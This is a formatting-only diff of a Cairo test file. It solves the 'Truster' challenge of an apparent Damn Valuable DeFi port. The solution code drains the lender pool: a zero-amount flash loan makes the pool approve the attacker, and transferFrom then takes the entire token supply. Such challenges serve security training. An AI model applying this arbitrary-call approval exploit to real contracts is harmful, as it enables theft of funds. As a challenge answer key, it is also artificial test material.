@@ -9,7 +9,6 @@ from openzeppelin.token.erc20.IERC20 import IERC20
 from src.truster.interfaces.ITrusterLenderPool import ITrusterLenderPool
 from src.DamnValuableToken import INITIAL_SUPPLY
 
-
 // * -------------------------------------------------------------------------- * //
 // *                               Initialization                               * //
 // * -------------------------------------------------------------------------- * //
@@ -44,7 +43,6 @@ func __setup__{syscall_ptr: felt*, range_check_ptr}() {
     return ();
 }
 
-
 // * -------------------------------------------------------------------------- * //
 // *                                   Hacking                                  * //
 // * -------------------------------------------------------------------------- * //
@@ -65,29 +63,22 @@ func test_hack{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
     // * ---------------------------- Your code here... --------------------------- * //
 
     let calldata: felt* = alloc();
-    tempvar initial_supply: Uint256  = Uint256(INITIAL_SUPPLY, 0);
+    tempvar initial_supply: Uint256 = Uint256(INITIAL_SUPPLY, 0);
 
     assert [calldata] = attacker;
     assert [calldata + 1] = initial_supply.low;
     assert [calldata + 2] = initial_supply.high;
-    
+
     let approve_selector = 949021990203918389843157787496164629863144228991510976554585288817234167820; // get_selector_from_name("approve")
 
     %{ start_prank(ids.attacker, target_contract_address=ids.TRUSTER_POOL) %}
     let (success: felt) = ITrusterLenderPool.flashLoan(
-        TRUSTER_POOL,
-        Uint256(0, 0),
-        attacker,
-        DVT,
-        approve_selector, 
-        3,
-        &[calldata]
+        TRUSTER_POOL, Uint256(0, 0), attacker, DVT, approve_selector, 3, &[calldata]
     );
     assert success = 1;
 
     %{ start_prank(ids.attacker, target_contract_address=ids.DVT) %}
     IERC20.transferFrom(DVT, TRUSTER_POOL, attacker, Uint256(INITIAL_SUPPLY, 0));
-
 
     // * -------------------------------- Checking -------------------------------- * //
 
